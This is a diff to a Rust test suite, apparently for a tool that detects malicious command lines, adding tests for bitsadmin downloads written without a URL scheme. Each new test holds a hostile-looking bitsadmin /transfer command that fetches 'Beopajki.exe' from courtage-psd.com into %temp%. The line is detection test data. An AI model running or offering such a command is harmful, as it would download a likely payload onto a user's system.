@@ -4811,6 +4811,22 @@ mod bitsadmin_tests {
         });
         assert!(has, "no BitsadminDownload: {:?}", env.traits);
     }
+
+    #[test]
+    fn bitsadmin_transfer_accepts_schemeless_domain_path() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
+            )
+        });
+        assert!(has, "no schemeless BitsadminDownload: {:?}", env.traits);
+    }
 }
 
 #[cfg(test)]
@@ -7416,6 +7432,26 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert!(
             has,
             "no structured liberal bitsadmin download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_schemeless_domain_path_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured schemeless bitsadmin download: {:?}",
             env.traits
         );
     }
